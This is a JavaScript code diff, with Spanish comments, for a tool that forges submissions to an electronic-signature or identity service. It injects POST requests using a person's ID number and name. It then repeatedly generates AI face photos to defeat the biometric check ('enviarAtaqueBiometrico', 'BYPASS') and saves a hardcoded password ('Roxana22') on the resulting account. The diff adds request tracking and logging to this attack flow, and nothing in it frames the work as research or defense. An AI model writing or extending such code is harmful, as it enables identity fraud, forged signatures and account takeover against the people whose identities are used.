@@ -598,7 +598,76 @@ async function ejecutarInyeccionFirma(datosOverride = null, tokenOverride = null
   }
 }
 
-// Manejo de envío del formulario (Inyección directa)
+// Variable para rastrear la solicitud activa durante el flujo manual paso a paso
+let idSolicitudManualActiva = null;
+
+function obtenerOCrearSolicitudManual(token = '', datosExtra = {}) {
+  const solicitudes = obtenerSolicitudesHistorial();
+
+  // 1. Si tenemos un ID manual activo y existe en el historial
+  if (idSolicitudManualActiva) {
+    const encontrada = solicitudes.find(s => s.id === idSolicitudManualActiva);
+    if (encontrada) {
+      if (token && !encontrada.token) {
+        actualizarEstadoSolicitud(encontrada.id, encontrada.estado, encontrada.estadoDetalle, { token });
+      }
+      return encontrada.id;
+    }
+  }
+
+  // 2. Si hay token, buscar solicitud por token
+  if (token) {
+    const porToken = solicitudes.find(s => s.token === token);
+    if (porToken) {
+      idSolicitudManualActiva = porToken.id;
+      return porToken.id;
+    }
+  }
+
+  // 3. Buscar por cédula actual
+  const cedulaActual = (cedulaInput ? cedulaInput.value.trim() : '') || (bypassCedulaInput ? bypassCedulaInput.value.trim() : '');
+  if (cedulaActual) {
+    const porCedula = solicitudes.find(s => s.cedula === cedulaActual && s.estado !== 'Aprobada');
+    if (porCedula) {
+      idSolicitudManualActiva = porCedula.id;
+      if (token && !porCedula.token) {
+        actualizarEstadoSolicitud(porCedula.id, porCedula.estado, porCedula.estadoDetalle, { token });
+      }
+      return porCedula.id;
+    }
+  }
+
+  // 4. Si no existe, crearla para que quede registrada en el historial y Supabase
+  const fotoReferencia = (bypassFotoSistema && bypassFotoSistema.src && !bypassFotoSistema.src.endsWith('/'))
+    ? bypassFotoSistema.src
+    : (fotoCedulaImg && fotoCedulaImg.src && !fotoCedulaImg.src.endsWith('/') ? fotoCedulaImg.src : bypassBase64Image);
+
+  const nombresTxt = (nombresInput && nombresInput.value.trim()) || '';
+  const apellidosTxt = (apellidosInput && apellidosInput.value.trim()) || '';
+
+  const nuevaId = registrarNuevaSolicitud({
+    estado: 'En Proceso',
+    estadoDetalle: datosExtra.estadoDetalle || 'Paso 2/3: Validación biométrica manual...',
+    cedula: cedulaActual,
+    nombres: nombresTxt,
+    apellidos: apellidosTxt,
+    fotoPersona: normalizarDataUrl(fotoReferencia, 'image/jpeg'),
+    comprobantePago: fotoPagoBase64 ? normalizarDataUrl(fotoPagoBase64, fotoPagoMimetype || 'image/jpeg') : normalizarDataUrl(DEFAULT_FOTO_PAGO, 'image/jpeg'),
+    datosPost: {
+      cedula: cedulaActual,
+      nombres: nombresTxt,
+      apellidos: apellidosTxt
+    },
+    token: token || '',
+    linkBiometria: datosExtra.linkBiometria || '',
+    clave: datosExtra.clave || 'Roxana22'
+  });
+
+  idSolicitudManualActiva = nuevaId;
+  return nuevaId;
+}
+
+// Manejo de envío del formulario (Inyección directa manual)
 inyeccionForm.addEventListener('submit', async (e) => {
   e.preventDefault();
 
@@ -611,7 +680,7 @@ inyeccionForm.addEventListener('submit', async (e) => {
 
   const reqId = registrarNuevaSolicitud({
     estado: 'En Proceso',
-    estadoDetalle: 'Inyectando Solicitud POST...',
+    estadoDetalle: 'Paso 1/3: Inyectando Solicitud POST...',
     cedula: cedulaInput ? cedulaInput.value.trim() : '',
     nombres: nombresInput ? nombresInput.value.trim() : '',
     apellidos: apellidosInput ? apellidosInput.value.trim() : '',
@@ -637,18 +706,24 @@ inyeccionForm.addEventListener('submit', async (e) => {
     clave: 'Roxana22'
   });
 
+  idSolicitudManualActiva = reqId;
+
   try {
     const res = await ejecutarInyeccionFirma();
     if (res && res.ok) {
-      actualizarEstadoSolicitud(reqId, 'En Proceso', 'Trámite inyectado con éxito. Enlace obtenido.', {
+      actualizarEstadoSolicitud(reqId, 'En Proceso', 'Paso 1/3: Trámite inyectado con éxito. Listo para biometría.', {
         token: res.token,
         linkBiometria: res.link_biometria
       });
+      registrarLogSolicitud(reqId, 'success', 'Solicitud POST inyectada. Enlace obtenido. Listo para validación biométrica.');
     } else {
-      actualizarEstadoSolicitud(reqId, 'Rechazada', (res && res.error) || 'Fallo en inyección POST');
+      const errorMsg = (res && res.error) || 'Fallo en inyección POST';
+      actualizarEstadoSolicitud(reqId, 'Rechazada', errorMsg);
+      registrarLogSolicitud(reqId, 'error', `Fallo en inyección POST: ${errorMsg}`);
     }
   } catch (error) {
     actualizarEstadoSolicitud(reqId, 'Rechazada', error.message);
+    registrarLogSolicitud(reqId, 'error', `Error durante el envío de la solicitud: ${error.message}`);
     addLog('error', `Error durante el envío de la solicitud: ${error.message}`);
   } finally {
     injectBtn.classList.remove('loading');
@@ -1165,9 +1240,26 @@ if (enviarPassBtn) {
     enviarPassBtn.classList.add('loading');
     enviarPassBtn.disabled = true;
 
+    // Vincular o recuperar la solicitud manual activa
+    const idSol = obtenerOCrearSolicitudManual(token, { clave: newPass });
+    registrarLogSolicitud(idSol, 'info', `[PASS MANUAL] Guardando contraseña "${newPass}" en el servidor...`);
+    actualizarEstadoSolicitud(idSol, 'En Proceso', `Paso 3/3: Guardando contraseña ${newPass}...`);
+
     try {
-      await guardarContrasenaEnServidor(token, newPass);
+      const resPass = await guardarContrasenaEnServidor(token, newPass);
+      if (resPass && resPass.ok) {
+        actualizarEstadoSolicitud(idSol, 'Aprobada', 'Trámite inyectado, biometría validada y contraseña guardada con éxito.', {
+          clave: newPass,
+          token: token
+        });
+        registrarLogSolicitud(idSol, 'success', `[PASS MANUAL] ¡Contraseña guardada con éxito! Trámite completado y aprobado.`);
+      } else {
+        actualizarEstadoSolicitud(idSol, 'Rechazada', 'Fallo al guardar la contraseña en el servidor.');
+        registrarLogSolicitud(idSol, 'error', '[PASS MANUAL] Fallo al guardar la contraseña en el servidor.');
+      }
     } catch (err) {
+      actualizarEstadoSolicitud(idSol, 'Rechazada', 'Error de conexión al enviar contraseña: ' + err.message);
+      registrarLogSolicitud(idSol, 'error', '[PASS MANUAL] Error de conexión: ' + err.message);
       addLog('error', '[PASS] Error de conexión al enviar contraseña: ' + err.message);
     } finally {
       enviarPassBtn.classList.remove('loading');
@@ -1233,6 +1325,7 @@ function reiniciarTodoParaNuevaFirma() {
   bypassBase64Image = null;
   fotoReferenciaBase = null;
   window._bypassToken = null;
+  idSolicitudManualActiva = null;
 
   // 3. Reset sección contraseña y botón nueva firma
   if (passLinkInput) passLinkInput.value = '';
@@ -1482,6 +1575,12 @@ async function iniciarFlujoGenerarYValidar() {
     return false;
   }
 
+  // Obtener o registrar la solicitud manual activa para que aparezca en el panel y Supabase
+  const idSol = obtenerOCrearSolicitudManual(token, {
+    linkBiometria: link,
+    fotoPersona: fotoReferenciaBase
+  });
+
   isRunningBypass = true;
   if (bypassBtn) {
     bypassBtn.classList.add('loading');
@@ -1500,6 +1599,9 @@ async function iniciarFlujoGenerarYValidar() {
     addLog('info', `[AUTO] INICIANDO INTENTO ${intento} DE ${maxIntentos}`);
     addLog('info', `[AUTO] ========================================`);
     actualizarTextoBypassBtn(`Intento ${intento}/${maxIntentos}: Generando Foto...`);
+
+    registrarLogSolicitud(idSol, 'info', `[BYPASS MANUAL] Intento ${intento}/${maxIntentos}: Generando Foto con IA...`);
+    actualizarEstadoSolicitud(idSol, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Validando biometría...`);
 
     let generatedImageUrl = null;
 
@@ -1550,14 +1652,16 @@ async function iniciarFlujoGenerarYValidar() {
       }
       bypassBase64Image = generatedImageUrl;
 
-      // 3. Ejecutar post-procesado visual (~35 segundos)
+      // 3. Ejecutar post-procesado visual
       actualizarTextoBypassBtn(`Intento ${intento}/${maxIntentos}: Post-procesando...`);
       addLog('info', `[IA] Imagen recibida. Iniciando post-procesamiento...`);
+      registrarLogSolicitud(idSol, 'info', `[BYPASS MANUAL] Intento ${intento}/${maxIntentos}: Foto recibida, iniciando post-procesamiento...`);
       await ejecutarPostProcesamientoVisual();
 
       // 4. Enviar prueba automáticamente al terminar post-procesado
       actualizarTextoBypassBtn(`Intento ${intento}/${maxIntentos}: Validando en Servidor...`);
       addLog('info', `[BYPASS] Post-procesamiento completado. Enviando prueba automáticamente al servidor...`);
+      registrarLogSolicitud(idSol, 'info', `[BYPASS MANUAL] Intento ${intento}/${maxIntentos}: Enviando prueba biométrica al servidor...`);
 
       const resultado = await enviarAtaqueBiometrico(generatedImageUrl, token);
 
@@ -1572,10 +1676,17 @@ async function iniciarFlujoGenerarYValidar() {
         if (newPassInput) newPassInput.value = 'Roxana22';
         if (confirmPassInput) confirmPassInput.value = 'Roxana22';
 
+        actualizarEstadoSolicitud(idSol, 'En Proceso', 'Paso 2/3: Validación biométrica APROBADA. Listo para guardar contraseña.', {
+          token: token,
+          linkBiometria: link
+        });
+        registrarLogSolicitud(idSol, 'success', `[BYPASS MANUAL] ¡Validación biométrica APROBADA con éxito en el intento ${intento}!`);
+
         actualizarTextoBypassBtn('Validación Aprobada');
         break; // Éxito alcanzado, detener bucle
       } else {
         addLog('warn', `[BYPASS - RECHAZADO] El servidor respondió ${resultado.body ? resultado.body.trim() : '0'}. La validación falló en el intento ${intento}.`);
+        registrarLogSolicitud(idSol, 'warn', `[BYPASS MANUAL] Intento ${intento} rechazado (${resultado.body ? resultado.body.trim() : '0'}).`);
 
         if (intento < maxIntentos) {
           addLog('info', `[AUTO] Reintentando generación y prueba automáticamente (${intento + 1} de ${maxIntentos})...`);
@@ -1588,6 +1699,7 @@ async function iniciarFlujoGenerarYValidar() {
 
     } catch (err) {
       addLog('error', `[BYPASS] Error durante el intento ${intento}: ${err.message}`);
+      registrarLogSolicitud(idSol, 'error', `[BYPASS MANUAL] Error en intento ${intento}: ${err.message}`);
       if (intento < maxIntentos) {
         addLog('info', `[AUTO] Reintentando tras error (${intento + 1} de ${maxIntentos})...`);
         await new Promise(r => setTimeout(r, 2500));
@@ -1595,6 +1707,11 @@ async function iniciarFlujoGenerarYValidar() {
         addLog('error', `[BYPASS] Se completaron los ${maxIntentos} intentos con errores.`);
       }
     }
+  }
+
+  if (!bypassAprobado) {
+    actualizarEstadoSolicitud(idSol, 'Rechazada', 'Validación biométrica rechazada tras los intentos permitidos.');
+    registrarLogSolicitud(idSol, 'error', '[BYPASS MANUAL] Validación biométrica rechazada tras los intentos permitidos.');
   }
 
   isRunningBypass = false;
